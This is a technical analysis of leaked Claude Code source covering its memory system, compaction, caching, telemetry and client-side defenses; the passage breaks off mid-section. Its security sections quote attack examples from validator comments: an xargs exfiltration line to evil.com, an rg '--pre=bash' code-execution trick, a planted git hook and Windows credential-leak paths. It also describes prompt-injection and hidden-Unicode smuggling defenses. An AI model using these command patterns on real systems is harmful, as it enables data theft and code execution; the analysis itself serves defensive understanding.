# Claude Code Source Analysis

## Scope and confidence

This analysis is based on the leaked `src/` tree in this workspace, not on a clean git checkout, npm tarball metadata, or Anthropic's private repos. That matters.

- The artifact appears to be a shipped/transpiled build, not a normal source checkout. Many files contain inline `//# sourceMappingURL=data:application/json...` payloads with embedded `sourcesContent`; examples include `src/replLauncher.tsx:23` and `src/commands/session/session.tsx:140`.
- I found 552 files with inline data-URI sourcemaps. I did not find standalone `.map` files or a `package.json` in this extracted tree.
- The artifact is incomplete. `src/main.tsx` imports `src/assistant/index.js` and `src/assistant/gate.js`, but only `src/assistant/sessionHistory.ts` is present in `src/assistant/`.
- Parts of the code clearly correspond to the external/public build, not Anthropic's internal "ant" build. For example, `src/utils/permissions/bashClassifier.ts` is a stub that explicitly says classifier permissions are "ANT-ONLY", and `src/main.tsx` contains compiled branches like `"external" === 'ant'`.

So:

- High confidence: architecture, memory design, compaction logic, telemetry shape, visible feature flags, client-side defensive layers.
- Medium confidence: exact release mechanism, long-lived assistant internals, internal-only model aliases, internal-only safety systems.
- Low confidence: anything that would have lived in missing `assistant/*` files or in Anthropic-only config served remotely.
- For “enumerate everything and cite it” work (skills/flags/config keys/event names), see `CATALOG-claudecode.md`.

## Executive summary

- Claude Code has a more sophisticated memory stack than "just `MEMORY.md`", but it is still fundamentally prompt-and-files driven. The interesting parts are the layering: persistent memory files, per-session memory summaries, per-agent scoped memory, daily log mode for long-lived assistant sessions, and a background "dream" consolidation pass.
- The client has real defensive code, not only prompt text. There are path hardening checks, dangerous delete guards, shell parsers/allowlists, SSRF protection for HTTP hooks, secret scanning before team-memory upload, and auto-mode permission scrubbing for dangerous Bash/PowerShell/Agent rules.
- Compaction is likely weak for structural reasons. They have several overlapping systems (`snip`, microcompact, cached microcompact, session-memory compaction, full summarization compaction, context collapse), and the legacy full compaction prompt is extremely verbose. After compaction, they also rehydrate files, plans, skill content, deferred tool deltas, and MCP instruction deltas, which claw back a lot of the saved context.
- They care a lot about prompt-cache stability. A large amount of the code is there to avoid busting cache keys: latched beta headers, prompt-cache break detection, tool-schema memoization, cache-edit based microcompact, cloned replacement state for forks, and transcript-seeded replacement reconstruction on resume.
- Telemetry is extensive. They fan out to Datadog plus a first-party OTel exporter, enrich events with session/model/env/process metadata, hash repo remotes, optionally log MCP tool details, persist failed 1P batches to disk for retry, and have both heuristic negativity detection and a heavier `/insights` pipeline that mines full local session history.
- The artifact contains many traces of hidden or semi-hidden initiatives: Kairos assistant mode, Brief tooling, Ultraplan remote planning, team/teammate infrastructure, cron/scheduling hooks, Harbor/Lodestone/remote-control features, and ant-only model alias plumbing. I found no direct `mythos` hits in this artifact.

## Likely release mechanism

### What the artifact proves

- The leaked tree is not just minified bundle output. It contains source-rich transpiled files with inline sourcemaps.
- Those sourcemaps include `sourcesContent`, which is enough to reconstruct near-original source text.
- This explains why people could recover readable source even if the package only shipped emitted JS/TSX.
- Multiple modules are explicitly “stub for external builds”, implying an internal-vs-external overlay system and that this artifact corresponds to a shipped bundle with internal-only code replaced/removed (e.g. `src/moreright/useMoreRight.tsx:1-5`, `src/utils/permissions/bashClassifier.ts:1`).

### What the artifact does not prove

- I cannot prove from this tree alone whether the leak happened because npm published separate `.map` files, inline data-URI sourcemaps, or both.
- I also cannot prove exactly which published package version contained the leak, because the artifact has no `package.json`, tarball manifest, or npm metadata.

### Best current hypothesis

The most likely explanation is:

1. Anthropic published a build artifact that retained inline sourcemaps.
2. Those maps embedded `sourcesContent`.
3. Recovering the code was therefore a packaging problem, not a need to reverse-engineer minified output.

That is consistent with the evidence in `src/replLauncher.tsx`, `src/commands/session/session.tsx`, and the count of 552 inline sourcemap-bearing files.

## What this codebase is

Claude Code is not a small CLI wrapper around one model call. It is a large feature-flagged agent platform with:

- A REPL/TTY front end.
- A big tool surface (`Bash`, `Read`, `Edit`, `Write`, `Glob`, `Grep`, `Agent`, `Skill`, MCP tools, remote/bridge tools, monitor/background-task tools).
- Several agent modes: normal REPL, proactive mode, brief/chat mode, long-lived assistant mode, subagents, coordinator/team modes, remote-control sessions, and remote planning flows like Ultraplan.
- Multiple memory layers.
- Multiple context-size controls.
- A serious observability pipeline.
- A large amount of runtime experimentation via GrowthBook, Statsig, and dynamic config.

The two main "control planes" are:

- Build-time `feature('...')` gates, which determine what code ships.
- Runtime GrowthBook/Statsig/dynamic config gates, which determine what turns on in a given session.

Representative gate hubs are `src/main.tsx`, `src/commands.ts`, `src/constants/prompts.ts`, `src/services/api/claude.ts`, and `src/skills/bundled/index.ts`.

## Model steering and prompt engineering

### `@[MODEL LAUNCH]` temporal gates

The system prompt is littered with `@[MODEL LAUNCH]` annotations marking sections that need revisiting per model release. Several are explicitly tied to Capybara:

- `@[MODEL LAUNCH]: Update comment writing for Capybara — remove or soften once the model stops over-commenting by default`
- `@[MODEL LAUNCH]: capy v8 thoroughness counterweight (PR #24302) — un-gate once validated on external via A/B`
- `@[MODEL LAUNCH]: False-claims mitigation for Capybara v8 (29-30% FC rate vs v4's 16.7%)` (`src/constants/prompts.ts:237-242`)

The false-claims mitigation is ant-only and explicitly tells the model: "Report outcomes faithfully: if tests fail, say so with the relevant output; if you did not run a verification step, say that rather than implying it succeeded." This is a direct prompt-level countermeasure for a measured regression: Capybara v8's 29-30% false claims rate vs v4's 16.7%.

### Dynamic boundary marker for cache stability

`src/constants/prompts.ts:114-115` defines `SYSTEM_PROMPT_DYNAMIC_BOUNDARY = '__SYSTEM_PROMPT_DYNAMIC_BOUNDARY__'`. Content before this marker is static (cross-org cacheable at scope `'global'`); content after is session-specific. This is the structural mechanism that separates the cacheable prompt prefix from per-session dynamic content.

### Build-time dead code elimination for ant paths

Ant-specific prompt sections use `process.env.USER_TYPE === 'ant'` directly at each callsite. A comment explains why (`src/constants/prompts.ts:617-619`):

> DCE: `process.env.USER_TYPE === 'ant'` is build-time --define. It MUST be inlined at each callsite (not hoisted to a const) so the bundler can constant-fold it to `false` in external builds and eliminate the branch.

The external build is physically smaller — ant-only code paths are stripped entirely, not just gated.

### "Undercover" mode

When enabled, undercover mode keeps ALL model names/IDs out of the system prompt — including public `FRONTIER_MODEL_*` constants — so nothing internal can leak into public commits/PRs. If those constants ever point at an unannounced model, they won't appear in context (`src/constants/prompts.ts:610-628`).

### Ant vs external output coaching

External builds get terse output rules ("Go straight to the point... ≤25 words between tool calls... ≤100 words unless the task requires more detail"). Ant builds instead get detailed communication coaching: "Write user-facing text in flowing prose while eschewing fragments, excessive em dashes, symbols and notation" (`src/constants/prompts.ts:403-427`).

### Terminal focus awareness

In proactive/autonomous mode, the system prompt includes a `terminalFocus` field and calibrates autonomy accordingly (`src/constants/prompts.ts:911-913`):

- **Unfocused**: "The user is away. Lean heavily into autonomous action — make decisions, explore, commit, push..."
- **Focused**: "The user is watching. Be more collaborative..."

### Tick-based proactive mode

Proactive mode sends `<tick>` prompts to keep the agent alive between turns. The system prompt tells the model that each tick includes the user's local time, and explicitly warns: "If you have nothing useful to do on a tick, you MUST call Sleep. Never respond with only a status message — that wastes a turn and burns tokens for no reason." It also reveals the 5-minute prompt cache expiry: "Each wake-up costs an API call, but the prompt cache expires after 5 minutes of inactivity — balance accordingly" (`src/constants/prompts.ts:860-914`).

### Verification agent accountability model

When the `tengu_hive_evidence` gate is active, the system prompt injects an explicit accountability contract (`src/constants/prompts.ts:390-395`):

- "You are the one reporting to the user; you own the gate."
- On FAIL: fix, resume the verifier with findings plus fix, repeat until PASS.
- On PASS: spot-check it — re-run 2-3 commands from the verifier's report.
- On PARTIAL: report what passed and what could not be verified. "You cannot self-assign PARTIAL."

### Compaction analysis scratchpad

The compaction prompt uses `<analysis>` XML blocks as a hidden scratchpad: the model writes its analysis inside `<analysis>...</analysis>`, which improves summary quality, but `formatCompactSummary()` strips the block before the summary reaches the context window. The user never sees it, and it doesn't consume ongoing context (`src/services/compact/prompt.ts:31-32, 314-319`).

### Cyber risk instruction is Safeguards-owned

`src/constants/cyberRiskInstruction.ts` carries an explicit header: "IMPORTANT: DO NOT MODIFY THIS INSTRUCTION WITHOUT SAFEGUARDS TEAM REVIEW" and names the owners (David Forsythe, Kyla Guru). This is the prompt section controlling how Claude handles pentesting, CTF requests, and the offensive/defensive security boundary.

## Memory system

### Short take

The memory system is better than a single `MEMORY.md`, but it is still not a state-of-the-art structured long-term memory stack. It is a layered markdown-memory design with background extraction and consolidation.

### Layers

#### 1. Instruction memory (`CLAUDE.md` family)

`src/utils/claudemd.ts` implements instruction memory loading from:

- managed memory
- user memory
- project memory
- local memory

It also supports `@include` directives with an allowlisted set of text file extensions. This is instruction memory, not the autobiographical memory system, but it is part of the overall "agent memory" shape.

#### 2. Persistent memdir memory

`src/memdir/paths.ts` and `src/memdir/memdir.ts` implement the auto-memory directory and entrypoint prompt.

Important traits:

- Auto-memory is on by default unless disabled by environment, simple mode, remote restrictions, or settings.
- The system is file-based and categorized. Memory is typed around user/project/reference style durable facts rather than "everything from the session".
- `MEMORY.md` is used as an index/entrypoint, but it is deliberately truncated to bounded size.
- The harness pre-creates directories and tells the model not to waste turns on `mkdir` and existence checks.

This is not a vector DB or even a structured relational memory. It is markdown files plus a prompt contract.

#### 3. Relevant-memory retrieval

`src/memdir/findRelevantMemories.ts` does not embed all memories blindly each turn.

The flow is roughly:

1. Scan memory file headers/frontmatter.
2. Build a compact manifest.
3. Ask a side query model to choose a small set of relevant memories.

That is more thoughtful than always inlining all memory, but it is still model-mediated retrieval over textual summaries rather than deterministic retrieval over structured state.

#### 4. Background memory extraction

`src/services/extractMemories/extractMemories.ts` is one of the more interesting pieces.

Notable details:

- It runs as a forked/background agent at turn end.
- It shares the parent's prompt cache where possible.
- It has a constrained toolset: read-only shell plus read/search tools, with edit/write only inside the auto-memory directory.
- It pre-injects a manifest of existing memory files to avoid wasting tokens on directory listing.
- It coalesces runs and stashes trailing work so overlapping extractions do not pile up.
- It deliberately skips itself when the main agent already wrote memory files in that turn.

That mutual exclusion is good engineering. It avoids two agents racing to rewrite memory based on nearly identical context.

#### 5. Session memory

`src/services/SessionMemory/sessionMemory.ts` is a separate subsystem from memdir memory.

It maintains a per-session markdown summary file in the background and later lets compaction lean on that session summary instead of asking the model to freshly summarize the full transcript every time.

This looks like a pragmatic patch around the weaknesses of normal compaction.

#### 6. Kairos daily-log mode

When long-lived assistant mode is active, `src/memdir/paths.ts` and `src/memdir/memdir.ts` switch behavior:

- instead of treating `MEMORY.md` as the live main store,
- the system appends to daily logs under `logs/YYYY/MM/YYYY-MM-DD.md`,
- and a later `/dream` pass distills those logs into durable topic files plus a refreshed memory index.

This is the most "always-on agent" shaped part of the system I found.

#### 7. Dream / consolidation

`src/services/autoDream/autoDream.ts` and `src/services/autoDream/consolidationPrompt.ts` implement background memory consolidation.

Key properties:

- It is gated by time since last run, session count, and a lock.
- It runs as a constrained forked agent.
- It focuses on consolidating, pruning, and reorganizing memory files rather than answering user questions.
- Kairos mode appears to prefer a disk-skill version of dream instead of this background path.

#### 8. Agent-scoped memory

`src/tools/AgentTool/agentMemory.ts` and `src/tools/AgentTool/loadAgentsDir.ts` add per-agent memory scopes:

- user
- project
- local

Agent definitions that declare memory get memory tools and prompt addenda injected automatically. There is also an `AGENT_MEMORY_SNAPSHOT` path that can seed user-scope memory from project snapshots.

### Assessment of the memory design

#### What is good

- Multiple scopes: global-ish user memory, project memory, session memory, per-agent memory, assistant daily logs.
- Background extraction is tool-constrained and coalesced.
- Daily-log plus later distillation is a reasonable pattern for long-lived agents.
- The memory-path hardening in `src/memdir/paths.ts` is notably security-conscious.
- They avoid some obvious waste, like forcing the model to `ls` or `mkdir` memory directories.

#### What is weak

- The substrate is still markdown files and prompt conventions.
- Relevant-memory recall is model-selected, not deterministic.
- There is no visible evidence here of embeddings, graph memory, event sourcing, schema-constrained memory objects, or a high-quality consolidation service.
- Several memory layers overlap: memdir memory, session memory, content-replacement state, context-collapse state, daily logs, dream outputs, agent memory. That improves resilience but increases complexity.

#### Bottom line

This is a reasonably sophisticated file-based memory architecture, not state of the art. The interesting ideas are not "better memory primitives"; they are the workflow glue:

- coalesced background extraction
- daily logs for long-lived mode
- later distillation
- scoped agent memories
- cache-sharing forked agents

## Security, permissions, and steerability

### Short take

Claude Code has several real client-side defenses. The model is still trusted a lot, but the client is not just relying on a polite system prompt.

### 1. System-prompt steerability

`src/constants/prompts.ts` includes explicit steering around:

- asking before destructive actions
- not retrying denied tool calls
- warning the user about prompt injection in tool results
- avoiding common security vulnerabilities
- careful handling of hooks and system reminders

This is soft control, not hard enforcement, but it sets the behavioral baseline.

### 2. Permission modes and dangerous-rule scrubbing

`src/utils/permissions/permissionSetup.ts` is more than basic permission plumbing.

It explicitly strips or treats as dangerous:

- blanket Bash allow rules
- interpreter/prefix rules like `python:*`, `node:*`, `bash:*`, etc.
- PowerShell equivalents like `Invoke-Expression`, nested shells, `Start-Process`, `pwsh`, `powershell`, `cmd`
- Agent tool allow rules that would auto-approve subagent creation before the classifier can inspect intent

This matters for auto mode. They know that "safe prefix allow rules" can silently become arbitrary-code execution grants.

### 3. Path hardening

The path logic is strong enough that it deserves separate mention.

`src/utils/permissions/pathValidation.ts` and `src/utils/permissions/filesystem.ts` do all of the following:

- reject dangerous removals like `/`, drive roots, home dir, direct children of root, and wildcard wipes
- reject UNC/network path forms that could leak credentials
- reject tilde variants like `~root`, `~+`, `~-` that would expand differently in the shell
- reject shell expansion syntax in paths
- protect dangerous files and directories such as `.git`, `.vscode`, `.idea`, `.claude`, `.gitconfig`, shell rc files, `.mcp.json`, `.claude.json`
- protect Claude config and agent/command/skill directories under `.claude/`
- special-case internal readable/editable paths for plan files, agent memory, session memory, tool result dirs, etc.

There is also a very specific defense in `src/memdir/paths.ts`: `projectSettings` are intentionally excluded from `autoMemoryDirectory` resolution so a malicious repo cannot redirect auto-memory writes into something sensitive like `~/.ssh`.

### 4. Shell safety and read-only allowlisting

The Bash layer is not naive.

Relevant files:

- `src/tools/BashTool/readOnlyValidation.ts`
- `src/tools/BashTool/pathValidation.ts`
- `src/tools/BashTool/bashPermissions.ts`
- `src/tools/BashTool/bashSecurity.ts`

Observed defenses:

- read-only command allowlists with per-command safe-flag parsing
- explicit exclusions for dangerous variants such as exec-like `fd` flags
- AST-based shell parsing and semantic checks
- special handling for `--` end-of-options so attacker-controlled `-`-prefixed paths are still validated
- explicit dangerous `rm`/`rmdir` path checks
- careful wrapper handling (`nice`, `timeout`, `env`, `sudo`, etc.) so permission rules cannot be bypassed by wrapping commands

### 5. SSRF guard for HTTP hooks

`src/utils/hooks/ssrfGuard.ts` blocks:

- private IPv4 ranges
- link-local/cloud metadata ranges
- unique-local and link-local IPv6
- mapped IPv6 forms of blocked IPv4 addresses

Loopback is intentionally allowed for local dev use cases. That is a real SSRF mitigation for project-configured hooks.

### 6. Deep-link sanitization and injection resistance

`src/utils/deepLink/parseDeepLink.ts` rejects:

- control characters
- malformed repo slugs
- overlong prompt/cwd payloads
- hidden Unicode used for ASCII smuggling / hidden prompt injection

This is a good example of Anthropic hardening the non-chat edges of the product.

### 7. Secret scanning before team-memory upload

`src/services/teamMemorySync/secretScanner.ts` scans memory content on the client before upload.

The rule set includes many high-confidence token patterns for:

- Anthropic
- OpenAI
- GitHub
- GitLab
- Slack
- npm
- PyPI
- cloud providers
- observability vendors
- private keys

This is exactly the sort of defense you want if the product supports shared/team memory sync.

### 8. Prompt-injection and model-quirk mitigations

Some mitigations are direct policy, some are bug workarounds:

- system prompt tells the model to flag likely prompt injection in tool results
- `src/utils/messages.ts` adds sibling text around `tool_reference` expansions because certain models at the prompt tail can sample the stop sequence incorrectly
- `src/utils/toolResultStorage.ts` inserts synthetic text for empty tool results because some models otherwise terminate early
- `src/query.ts` strips model-bound thinking signatures before retrying a fallback model

These are not generic “AI safety” controls. They are concrete product hardening against observed model failure modes.

### 9. Specific exploit defenses in the Bash validator

The Bash read-only validator (`src/tools/BashTool/readOnlyValidation.ts`) contains remarkably specific exploit defenses that go well beyond simple allowlisting:

#### GNU getopt optional-arg-attachment attacks

The validator removes `xargs -i` and `xargs -e` (lowercase) because GNU getopt's `i::` and `e::` optional-attached-arg semantics create a parsing ambiguity: `xargs -it tail target` is parsed as `-i` with replacement string `t`, making `tail` the target command — not `-i` + `-t` as the validator would assume. The comment even walks through the network exfiltration chain: `echo /usr/sbin/sendm | xargs -it tail a@evil.com`. The fix is to require uppercase `-I {}` (POSIX, mandatory argument) where validator and xargs agree (`src/tools/BashTool/readOnlyValidation.ts:132-155`).

#### Variable expansion injection

Every token is rejected if it contains `$`, because `git diff “$Z--output=/tmp/pwned”` defeats the `startsWith('-')` flag check when `$Z` is empty. Similarly, `rg . “$Z--pre=bash” FILE` achieves RCE via rg's `--pre` flag, and `ps ax”$Z”e` defeats the BSD-style `e` flag regex to expose env vars. Brace expansion with `,` or `..` is also blocked (`src/tools/BashTool/readOnlyValidation.ts:1328-1370`).

#### tree -R file write

`tree -R` combined with `-H` (HTML mode) and `-L` (depth) silently writes `00Tree.html` files to every subdirectory at the depth boundary. The comment quotes the man page: “at each of them execute tree again adding `-o 00Tree.html` as a new option.” Zero-permission file write, no warning (`src/tools/BashTool/readOnlyValidation.ts:657-664`).

#### Compound cd + git sandbox escape

Compound commands combining `cd` and `git` are blocked because `cd /malicious/dir && git status` can trigger git hooks in the target directory. Also detected: bare git repos (`.git/HEAD` deleted, hooks created in cwd), and write-to-git-internals attacks like `mkdir -p objects refs hooks && echo '#!/bin/bash\nmalicious' > hooks/pre-commit && touch HEAD && git status` (`src/tools/BashTool/readOnlyValidation.ts:1876-1949`).

#### Windows path canonicalization attacks

`src/utils/permissions/filesystem.ts:537-602` detects NTFS Alternate Data Streams (`file.txt:stream`, `file.txt::$DATA`), 8.3 short names (`GIT~1`, `CLAUDE~1`), long path prefixes (`\\?\C:\...`), trailing dots/spaces (`.git.`, `.claude ` — Windows strips these, bypassing string matching), DOS device names (`.git.CON`, `settings.json.PRN`), and three+ consecutive dots. Any detected pattern forces manual approval.

Windows `xargs` is disabled entirely (`src/tools/BashTool/readOnlyValidation.ts:1203-1209`) because file contents can contain UNC paths that trigger SMB resolution — `cat file | xargs cat` turns data exfiltration into credential exfiltration.

### 10. Unicode hidden-character defense (HackerOne #3086545)

`src/utils/sanitization.ts` implements iterative Unicode sanitization against ASCII smuggling / hidden prompt injection. It loops NFKC normalization plus stripping of `\p{Cf}`, `\p{Co}`, `\p{Cn}` property classes (plus explicit fallback ranges for zero-width spaces, directional formatting, BOM, private use) up to 10 iterations until the string stabilizes. The iteration cap prevents infinite loops from adversarial composed sequences. The fallback ranges exist because “some environments don't support regexes for unicode property classes.”

### 11. Job directory nonce-based hijack guard

The `CLAUDE_JOB_DIR` write carve-out (`src/utils/permissions/filesystem.ts:1514-1551`) uses a per-process random nonce as the “load-bearing defense.” The comment explains: every other path component (uid, version, skill name, file keys) is public knowledge, so without the nonce, a local attacker on shared `/tmp` can pre-create the tree (sticky bit prevents deletion, not creation) and either symlink an intermediate directory or swap file contents post-write for prompt injection.

### 12. bypassPermissions remote killswitch

`src/utils/permissions/bypassPermissionsKillswitch.ts` can remotely disable `bypassPermissions` mode via Statsig gate `tengu_disable_bypass_permissions_mode`. The check runs exactly once before the first query, ensuring the latest gate value is used. This is emergency-response infrastructure: Anthropic can remotely downgrade permission modes on running installations.

### 13. Harbor “channels” + permission relay

There is an entire “send Claude prompts to your phone” surface here, implemented as MCP “channels” plugins and gated at runtime.

Key pieces:

- Channels are globally gateable via GrowthBook (`tengu_harbor`) and allowlisted per-plugin via a GrowthBook “ledger” (`tengu_harbor_ledger`) (`src/services/mcp/channelAllowlist.ts:37-76`).
- Permission dialogs can be relayed over channels like Telegram/iMessage/Discord, and approvals are *structured* events (`notifications/claude/channel/permission`), not raw-text injection (`src/services/mcp/channelPermissions.ts:1-23`, `src/services/mcp/channelPermissions.ts:169-194`).
- The 5-letter request IDs are designed for phone usability and have an explicit substring blocklist so they don’t accidentally spell offensive words (`src/services/mcp/channelPermissions.ts:75-110`, `src/services/mcp/channelPermissions.ts:130-152`).

This is notable both as an “always-on agent” affordance and as a security tradeoff: the comments explicitly acknowledge that a compromised channel server could fabricate approvals, and they treat the allowlist as the real trust boundary (`src/services/mcp/channelPermissions.ts:15-23`).

### What does not appear to exist

- I did not find a strong semantic "mass deletion prevention" layer beyond the permission system, path protections, and model instructions.
- `src/tools/BashTool/destructiveCommandWarning.ts` is explicitly informational only. It is only surfaced in the permission UI (`src/components/permissions/BashPermissionRequest/BashPermissionRequest.tsx`), not used as a hard block.
- In this external-ish artifact, Bash classifier permissions are stubbed out (`src/utils/permissions/bashClassifier.ts`), so any richer classifier-based shell defense likely lives only in internal builds.

### Overall security judgment

The product is meaningfully more hardened than "LLM plus shell". The defenses are layered and often quite practical. The weak point is that they still rely heavily on prompt steering plus a very large and complex permission/shell subsystem. Complexity itself becomes attack surface and bug surface.

## Performance, caching, and compaction

### Short take

This is one of the most revealing parts of the codebase. Claude Code is obsessed with prompt-cache stability, but its full compaction strategy still looks worse than it should be.

### 1. Prompt-cache engineering is everywhere

Key examples:

- `src/utils/toolSchemaCache.ts` memoizes tool schemas because any byte-level change in tool schemas busts the whole cached prefix.
- `src/services/api/claude.ts` latches several dynamic beta headers and 1h-cache eligibility so mid-session feature flips do not blow the cache key.
- `src/services/api/promptCacheBreakDetection.ts` snapshots prompt/tool/model state, diffs potential break causes, and writes debug diffs when cache reads unexpectedly drop.
- `src/utils/forkedAgent.ts` preserves cache-safe params when spawning forked agents so they share the parent's prompt cache.
- `src/utils/toolResultStorage.ts` clones and reconstructs content-replacement state specifically so cache-sharing forks and resumes make byte-identical decisions.

This is not accidental. Cache stability is a first-class design constraint.

### 2. Multiple overlapping context-control systems

From `src/query.ts`, the high-level pipeline is:

1. history snipping
2. microcompact
3. context collapse
4. auto compact

Then inside compaction there are sub-paths:

- cached microcompact
- time-based microcompact
- session-memory compaction
- full LLM summarization compaction

This makes the system flexible, but it also creates more stateful edge cases than a single clean compaction mechanism.

### 2.5. What compaction actually does (step-by-step)

If you strip it to mechanics, the query loop does roughly:

1. **Tool-result “content replacement” budget** (prompt-cache stability trick): persist oversized tool results to disk and replace them with stable previews so subsequent turns are byte-identical (`src/query.ts:369-394`, `src/utils/toolResultStorage.ts:740-841`). The resume path treats this as critical cache infrastructure (“cache miss, permanent overage”) (`src/utils/sessionRestore.ts:459-467`).
2. **Snip** (history surgery): optionally removes chunks of earlier history while emitting a boundary marker; importantly, it plumbs back “tokens freed” because API-usage-based token accounting can’t see the removed prefix (`src/query.ts:396-406`, `src/services/compact/autoCompact.ts:164-168`).
3. **Microcompact**:
   - Time-based microcompact can clear old tool result contents via a deterministic replacement string and uses rough token estimates for tool results/images (`src/services/compact/microCompact.ts:32-50`, `src/services/compact/microCompact.ts:137-205`).
   - Cached microcompact builds `cache_edits` blocks, pins them to a specific user-message index, and re-sends pinned edits at their original positions to preserve cache hits (`src/services/compact/microCompact.ts:52-118`).
4. **Context collapse** (when enabled) projects and commits a collapsed view before autocompact to avoid replacing granular history with one mega-summary (`src/query.ts:428-447`).
5. **Autocompact** (full compaction attempt): computes thresholds with a reserved 20k output token budget, and includes a circuit breaker because they observed sessions hammering compaction tens of times (“~250K API calls/day globally”) (`src/services/compact/autoCompact.ts:28-70`, `src/services/compact/autoCompact.ts:257-260`).
6. **Session-memory compaction** (preferred when available): if a session memory file exists and is non-empty, it uses it as the summary substrate; the “resumed session” path has no true boundary and logs `tengu_sm_compact_resumed_session` (`src/services/compact/sessionMemoryCompact.ts:529-566`).
7. **Full LLM-summary compaction** (fallback): the prompt is extremely over-specified (it literally asks for “ALL user messages” plus code snippets, errors, pending tasks, etc.) (`src/services/compact/prompt.ts:61-76`). It also contains an “aggressive no-tools preamble” because adaptive-thinking models sometimes try to call tools during compaction (`src/services/compact/prompt.ts:12-23`).
8. **Post-compact rehydration**: even after producing a summary, it re-injects recently accessed file content, plan files, plan-mode state, invoked skills (truncated), and async-agent status attachments, which can claw back a lot of the saved context (`src/services/compact/compact.ts:1398-1600`).

This is the best client-side explanation for “why compaction feels bad”: the summary prompt is huge *and* the system intentionally re-attaches a lot of state immediately after.

### 3. Cached microcompact is clever

`src/services/compact/microCompact.ts` is the most technically interesting part of the context system.

The idea:

- detect older tool results that can be deleted
- keep local message content unchanged
- send cache-edit instructions at the API layer
- preserve the cached prefix instead of regenerating an edited prompt locally

That is much smarter than naive summarize-and-replace.

There is also a lot of defensive logic around it:

- state is global and therefore restricted to the main thread
- pending edits are consumed once
- deleted cache references are tracked to avoid duplicates
- old comments document prior bugs around output-style gating and cache-state poisoning

### 4. Session-memory compaction is a band-aid over poor full compaction

`src/services/compact/sessionMemoryCompact.ts` tries to use the per-session memory file as the compacted summary substrate.

That is a reasonable move. If the system already has a maintained session summary, reusing it is cheaper and probably more stable than asking the model to write a new mega-summary from scratch.

But it also reveals a weakness:

- when a session is resumed and there is no `lastSummarizedMessageId`, the code has no true boundary
- it logs a special `tengu_sm_compact_resumed_session` path
- it effectively starts from "everything is summarized / nothing can be trusted as the boundary" and then expands back to preserve minimums

That likely explains some of the "resume becomes expensive and weird" reports.

### 5. Why the full compaction quality is probably bad

The full compaction prompt in `src/services/compact/prompt.ts` is the smoking gun.

It asks for an exhaustive retrospective summary containing:

- all user asks
- file/code details
- errors
- pending tasks
- direct quotes
- multiple sections
- analysis plus summary wrappers

This is the opposite of a minimal task-state checkpoint.

Then `src/services/compact/compact.ts` rehydrates a lot of context immediately after compaction:

- recently read files
- current plan file
- plan-mode state
- invoked skills
- deferred tool deltas
- agent-listing delta
- MCP instructions delta
- session-start hooks

So even when compaction works, the product re-inflates the context right away.

### 5.5. Compaction by the numbers

Several concrete metrics are visible in comments and constants:

- **Circuit breaker**: Before `MAX_CONSECUTIVE_AUTOCOMPACT_FAILURES = 3` was added, BQ data from 2026-03-10 showed 1,279 sessions had 50+ consecutive compaction failures (up to 3,272 in a single session), wasting ~250K API calls/day globally (`src/services/compact/autoCompact.ts:257-260`).
- **Streaming fallback rate**: The no-tools forked summarizer fails 2.79% of the time on model 4.6 (vs 0.01% on 4.5), triggering a streaming fallback that has tool access — increasing injection surface and making compaction nondeterministic (`src/services/compact/prompt.ts:19-26`). The `NO_TOOLS_PREAMBLE` is repeated as both preamble AND trailer specifically because 4.6's failure rate is 279× higher.
- **Skill re-injection cost**: Skills are capped at 5K tokens per skill post-compact. Before this cap, re-injection was unbounded and cost 5-10K tokens per compact. The verify skill is 18.7KB and claude-api is 20.1KB (`src/services/compact/compact.ts:125-129`).
- **Cache cost of full compaction**: Full compaction invalidates the server's cached prefix. Test data showed this costs 0.76% of fleet `cache_creation` (~38B tokens/day globally), with 98% of the cost being cache misses for 3P users (`src/services/compact/compact.ts:432-434`).
- **Post-compact file budget**: `POST_COMPACT_TOKEN_BUDGET = 50K` tokens for file re-attachment — up to 5 recently-accessed files (`src/services/compact/compact.ts:1415-1430`).
- **Image token estimation**: `IMAGE_MAX_TOKEN_SIZE` is hardcoded at 2000 tokens, but actual images range 500-4000+ depending on format and resolution. This feeds into compaction threshold calculations (`src/services/compact/microCompact.ts:38`).
- **Token estimation multiplier**: All token estimates are padded by 4/3 "to be conservative since we're approximating" (`src/services/compact/microCompact.ts:204`), which masks 10-30% estimation errors for tool-heavy workloads.

### 5.6. Circular dependency fragility

The compaction subsystem has fragile circular import chains that have already caused CI failures:

- `src/services/compact/microCompact.ts:32-35` duplicates the `TIME_BASED_MC_CLEARED_MESSAGE` constant inline rather than importing it from `toolResultStorage.ts`, because that import pulls in `sessionStorage → utils/messages → services/api/errors`, completing a cycle back through `promptCacheBreakDetection`.
- `src/services/compact/grouping.ts:18-21` was extracted to its own file specifically to break a `compact.ts ↔ compactMessages.ts` cycle (issue CC-1180). The comment notes the cycle "shifted module-init order enough to surface a latent ws CJS/ESM resolution race in CI shard-2."

If someone re-imports `toolResultStorage.ts` into microcompact or adds functions to grouping, these cycles re-form silently.

### 6. Full compaction fallback exposes tools

This looks like an actual design bug.

In `src/services/compact/compact.ts`, the preferred compaction path is a no-tools forked summarizer. But the fallback streaming path still builds a tool list:

- always `FileReadTool`
- plus `ToolSearchTool` and MCP tools when tool search is enabled

The summarizer system prompt still says "summarize conversations", but the model has tool access. That increases prompt-injection surface, makes behavior noisier, and blurs the semantics of compaction.

### 7. Resume/cache fragility is visible in comments

Two files are particularly revealing:

- `src/utils/sessionRestore.ts`
- `src/utils/toolResultStorage.ts`

The fork-session resume path explicitly reseeds content-replacement records because otherwise tool results become "FROZEN", full content gets resent, and the comments say that leads to cache misses and "permanent overage".

That is a very strong hint that resume correctness is fragile and that the cache system is only stable when transcript reconstruction is byte-faithful.

### 7.5. `--resume` cache misses are plausible by construction

One important tradeoff is visible in the persistence layer:

- For non-`ant` users, Claude Code deliberately does not persist most `attachment` messages to the JSONL transcript, explicitly citing “sensitive info for training” (`src/utils/sessionStorage.ts:4351-4366`).
- But several cache-stability mechanisms are attachment-based “system reminders” (`deferred_tools_delta`, `agent_listing_delta`, `mcp_instructions_delta`, skill listings, etc.), which are normalized into meta user messages and can affect both message merging and the single per-request `cache_control` marker placement (`src/utils/messages.ts:2269-2290`, `src/utils/messages.ts:4178-4231`, `src/services/api/claude.ts:3062-3106`).

So a resumed session can easily reconstruct a byte-different prompt prefix even when “semantically the same”, forcing a one-turn full `cache_creation` reprocess on resume. The `deferred_tools_delta` system in particular was introduced to avoid per-request ephemeral prepends that bust cache (`src/services/api/claude.ts:1327-1345`, `src/utils/attachments.ts:1455-1475`), but that win depends on those deltas surviving resume.

### 8. Token counting is multi-layered and fragile

Token accounting lives across:

- `src/utils/tokens.ts`
- `src/services/tokenEstimation.ts`
- `src/services/api/claude.ts`

Interesting details:

